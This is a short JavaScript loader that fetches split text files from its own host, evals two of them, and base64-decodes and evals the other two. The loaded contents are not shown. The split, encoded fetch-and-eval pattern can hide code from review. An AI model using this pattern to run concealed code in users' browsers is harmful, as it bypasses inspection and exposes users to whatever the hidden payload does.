(async function(){
  const da = await (await fetch("data.p1.txt")).text();
  const db = await (await fetch("data.p2.txt")).text();
  eval(da+db);
  const a = await (await fetch("app.p1.txt")).text();
  const b = await (await fetch("app.p2.txt")).text();
  eval(decodeURIComponent(escape(atob(a+b))));
})();
